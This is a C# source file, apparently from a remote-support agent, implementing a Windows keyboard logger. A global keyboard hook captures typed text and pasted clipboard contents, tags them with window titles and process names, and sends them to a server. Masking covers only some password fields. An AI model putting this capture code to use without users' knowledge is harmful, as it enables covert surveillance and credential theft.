using Microsoft.Extensions.Logging;
using Remotely.Desktop.Shared.Abstractions;
using Remotely.Shared.Models;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace Remotely.Desktop.Win.Services;

/// <summary>
/// Captures the text that is typed in the session of this device with a
/// low-level keyboard hook.  The text is sent to the server in bursts, while
/// it is being typed.  The text of a field that holds a secret is never
/// stored.
/// </summary>
internal sealed class KeyboardLoggerWin : IKeyboardLogger
{
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private const int WM_SYSKEYDOWN = 0x0104;
    private const int GWL_STYLE = -16;
    private const int ES_PASSWORD = 0x20;
    private const int VK_CONTROL = 0x11;
    private const int VK_MENU = 0x12;
    private const int VK_SHIFT = 0x10;
    private const int VK_V = 0x56;
    private const uint CF_UNICODETEXT = 13;

    /// <summary>
    /// The text of one burst is sent when it has not been changed for this
    /// long.
    /// </summary>
    private static readonly TimeSpan _idleDelay = TimeSpan.FromMilliseconds(800);

    /// <summary>
    /// The longest burst that is sent in one piece.
    /// </summary>
    private const int _maxBurstLength = 2000;

    private readonly ILogger<KeyboardLoggerWin> _logger;
    private readonly StringBuilder _buffer = new();
    private readonly object _sync = new();

    private LowLevelKeyboardProc? _hookProc;
    private IntPtr _hookHandle = IntPtr.Zero;
    private Action<KeyboardLogChunk>? _onChunk;
    private Timer? _flushTimer;
    private string _windowTitle = string.Empty;
    private string _processName = string.Empty;
    private IntPtr _foregroundHandle = IntPtr.Zero;
    private bool _isPasswordField;
    private DateTimeOffset _lastCharAt = DateTimeOffset.MinValue;

    public KeyboardLoggerWin(ILogger<KeyboardLoggerWin> logger)
    {
        _logger = logger;
    }

    public bool IsRunning => _hookHandle != IntPtr.Zero;

    public void Start(Action<KeyboardLogChunk> onChunk)
    {
        if (IsRunning)
        {
            return;
        }

        try
        {
            _onChunk = onChunk;

            // The delegate has to be kept alive, or the hook is removed when
            // it is collected.
            _hookProc = HookProc;

            _hookHandle = SetWindowsHookEx(WH_KEYBOARD_LL, _hookProc, GetModuleHandle(null), 0);

            if (_hookHandle == IntPtr.Zero)
            {
                _logger.LogError("The keyboard hook could not be installed.");
                _hookProc = null;
                _onChunk = null;
                return;
            }

            _flushTimer = new Timer(_ => FlushIfIdle(), null, 250, 250);

            _logger.LogInformation("The keyboard capture was started.");
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "Error while starting the keyboard capture.");
            Stop();
        }
    }

    public void Stop()
    {
        if (_hookHandle != IntPtr.Zero)
        {
            try
            {
                UnhookWindowsHookEx(_hookHandle);
            }
            catch (Exception ex)
            {
                _logger.LogWarning(ex, "Error while removing the keyboard hook.");
            }

            _hookHandle = IntPtr.Zero;
        }

        _flushTimer?.Dispose();
        _flushTimer = null;
        _hookProc = null;
        _onChunk = null;

        lock (_sync)
        {
            _buffer.Clear();
            _windowTitle = string.Empty;
            _processName = string.Empty;
            _foregroundHandle = IntPtr.Zero;
        }

        _logger.LogInformation("The keyboard capture was stopped.");
    }

    private IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0)
        {
            var message = wParam.ToInt32();

            if (message == WM_KEYDOWN || message == WM_SYSKEYDOWN)
            {
                try
                {
                    HandleKeyDown(lParam);
                }
                catch (Exception ex)
                {
                    _logger.LogWarning(ex, "Error while capturing a keystroke.");
                }
            }
        }

        return CallNextHookEx(_hookHandle, nCode, wParam, lParam);
    }

    private void HandleKeyDown(IntPtr lParam)
    {
        var data = Marshal.PtrToStructure<KbdLlHookStruct>(lParam);

        var controlDown = (GetAsyncKeyState(VK_CONTROL) & 0x8000) != 0;
        var altDown = (GetAsyncKeyState(VK_MENU) & 0x8000) != 0;

        // The text of a paste is not typed, so the clipboard is read
        // instead.
        if (controlDown && !altDown && data.vkCode == VK_V)
        {
            AppendText(ReadClipboardText());
            return;
        }

        // The control and the alt keys modify the next key, so the
        // character of a shortcut is not the character that was typed.
        if (controlDown || altDown)
        {
            return;
        }

        var character = ToUnicode(data.vkCode, data.scanCode);

        if (!string.IsNullOrEmpty(character))
        {
            AppendText(character);
        }
    }

    private string? ToUnicode(int virtualKeyCode, int scanCode)
    {
        var keyboardState = new byte[256];

        if (!GetKeyboardState(keyboardState))
        {
            return null;
        }

        var buffer = new StringBuilder(8);
        var result = ToUnicodeEx(
            (uint)virtualKeyCode,
            (uint)scanCode,
            keyboardState,
            buffer,
            buffer.Capacity,
            0,
            IntPtr.Zero);

        // A negative result is a dead key, and a result of zero means that
        // the key does not produce a character.
        if (result <= 0)
        {
            return null;
        }

        return buffer.ToString();
    }

    private void AppendText(string text)
    {
        if (string.IsNullOrEmpty(text))
        {
            return;
        }

        lock (_sync)
        {
            var now = DateTimeOffset.Now;

            // The window and the process are only read again when the focus
            // moves to another window, so the cost of a keystroke stays low.
            var (title, processName, handle) = GetForegroundInfo();

            if (_buffer.Length > 0 && !string.Equals(title, _windowTitle, StringComparison.Ordinal))
            {
                FlushCore();
            }

            if (_buffer.Length == 0)
            {
                _windowTitle = title;
                _processName = processName;
                _foregroundHandle = handle;
                _isPasswordField = IsPasswordFocused(processName, handle);
            }

            _buffer.Append(text);
            _lastCharAt = now;

            if (_buffer.Length >= _maxBurstLength)
            {
                FlushCore();
            }
        }
    }

    private void FlushIfIdle()
    {
        lock (_sync)
        {
            if (_buffer.Length == 0 || DateTimeOffset.Now - _lastCharAt < _idleDelay)
            {
                return;
            }

            FlushCore();
        }
    }

    private void FlushCore()
    {
        if (_buffer.Length == 0)
        {
            return;
        }

        var text = _buffer.ToString();
        var title = _windowTitle;
        var processName = _processName;
        var isPasswordField = _isPasswordField;

        _buffer.Clear();
        _isPasswordField = false;

        var chunk = new KeyboardLogChunk(
            title,
            processName,
            isPasswordField ? Mask(text) : text,
            isPasswordField);

        try
        {
            _onChunk?.Invoke(chunk);
        }
        catch (Exception ex)
        {
            _logger.LogWarning(ex, "Error while sending a captured keystroke burst.");
        }
    }

    /// <summary>
    /// Hides the text of a field that holds a secret.  The number of the
    /// characters is kept, so it is still visible that something was typed.
    /// </summary>
    private static string Mask(string text)
    {
        var count = Math.Min(text.Length, 64);
        return new string('•', count);
    }

    /// <summary>
    /// Returns the title, the process, and the handle of the window that has
    /// the focus.  The title and the process are only read again when the
    /// focus moves to another window.
    /// </summary>
    private (string Title, string ProcessName, IntPtr Handle) GetForegroundInfo()
    {
        var window = GetForegroundWindow();

        if (window == IntPtr.Zero)
        {
            return (string.Empty, string.Empty, IntPtr.Zero);
        }

        if (window == _foregroundHandle)
        {
            return (_windowTitle, _processName, window);
        }

        var title = new StringBuilder(512);
        GetWindowText(window, title, title.Capacity);

        var processName = string.Empty;

        try
        {
            GetWindowThreadProcessId(window, out var processId);
            using var process = Process.GetProcessById((int)processId);
            processName = process.ProcessName;
        }
        catch (Exception)
        {
            // The process may have ended already.
        }

        _foregroundHandle = window;
        _windowTitle = title.ToString();
        _processName = processName;

        return (_windowTitle, _processName, window);
    }

    /// <summary>
    /// Returns true when the focused control is a field that holds a secret,
    /// or when a credential prompt of Windows has the focus.
    /// </summary>
    private static bool IsPasswordFocused(string processName, IntPtr window)
    {
        if (window == IntPtr.Zero)
        {
            return false;
        }

        // The credential prompts of Windows are always masked, because they
        // are shown on the secure desktop.
        if (processName is "LogonUI" or "CredentialUIBroker" or "consent")
        {
            return true;
        }

        var threadId = GetWindowThreadProcessId(window, out _);
        var info = new GuiThreadInfo { cbSize = Marshal.SizeOf<GuiThreadInfo>() };

        if (!GetGUIThreadInfo(threadId, ref info) || info.hwndFocus == IntPtr.Zero)
        {
            return false;
        }

        var style = GetWindowLongPtr(info.hwndFocus, GWL_STYLE);

        return (style & ES_PASSWORD) != 0;
    }

    /// <summary>
    /// Reads the text of the clipboard.
    /// </summary>
    private static string ReadClipboardText()
    {
        for (var attempt = 0; attempt < 3; attempt++)
        {
            if (!OpenClipboard(IntPtr.Zero))
            {
                Thread.Sleep(20);
                continue;
            }

            try
            {
                var handle = GetClipboardData(CF_UNICODETEXT);

                if (handle == IntPtr.Zero)
                {
                    return string.Empty;
                }

                var pointer = GlobalLock(handle);

                if (pointer == IntPtr.Zero)
                {
                    return string.Empty;
                }

                try
                {
                    return Marshal.PtrToStringUni(pointer) ?? string.Empty;
                }
                finally
                {
                    GlobalUnlock(handle);
                }
            }
            catch (Exception)
            {
                return string.Empty;
            }
            finally
            {
                CloseClipboard();
            }
        }

        return string.Empty;
    }

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    [StructLayout(LayoutKind.Sequential)]
    private struct KbdLlHookStruct
    {
        public int vkCode;
        public int scanCode;
        public int flags;
        public int time;
        public IntPtr dwExtraInfo;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct GuiThreadInfo
    {
        public int cbSize;
        public int flags;
        public IntPtr hwndActive;
        public IntPtr hwndFocus;
        public IntPtr hwndCapture;
        public IntPtr hwndMenuOwner;
        public IntPtr hwndMoveSize;
        public IntPtr hwndCaret;
        public RECT rcCaret;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct RECT
    {
        public int Left;
        public int Top;
        public int Right;
        public int Bottom;
    }

    [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", SetLastError = true)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll")]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string? lpModuleName);

    [DllImport("user32.dll")]
    private static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll", CharSet = CharSet.Unicode)]
    private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

    [DllImport("user32.dll")]
    private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

    [DllImport("user32.dll")]
    private static extern bool GetGUIThreadInfo(uint idThread, ref GuiThreadInfo lpgui);

    [DllImport("user32.dll", EntryPoint = "GetWindowLongW")]
    private static extern int GetWindowLong32(IntPtr hWnd, int nIndex);

    [DllImport("user32.dll", EntryPoint = "GetWindowLongPtrW")]
    private static extern IntPtr GetWindowLongPtr64(IntPtr hWnd, int nIndex);

    [DllImport("user32.dll")]
    private static extern short GetAsyncKeyState(int vKey);

    [DllImport("user32.dll")]
    private static extern bool GetKeyboardState(byte[] lpKeyState);

    [DllImport("user32.dll")]
    private static extern int ToUnicodeEx(
        uint wVirtKey,
        uint wScanCode,
        byte[] lpKeyState,
        StringBuilder lpChar,
        int cchBuff,
        uint wFlags,
        IntPtr lpKeyboardState);

    [DllImport("user32.dll")]
    private static extern bool OpenClipboard(IntPtr hWndNewOwner);

    [DllImport("user32.dll")]
    private static extern bool CloseClipboard();

    [DllImport("user32.dll")]
    private static extern IntPtr GetClipboardData(uint uFormat);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GlobalLock(IntPtr hMem);

    [DllImport("kernel32.dll")]
    private static extern bool GlobalUnlock(IntPtr hMem);

    private static IntPtr GetWindowLongPtr(IntPtr hWnd, int nIndex)
    {
        return IntPtr.Size == 8 ?
            GetWindowLongPtr64(hWnd, nIndex) :
            new IntPtr(GetWindowLong32(hWnd, nIndex));
    }
}
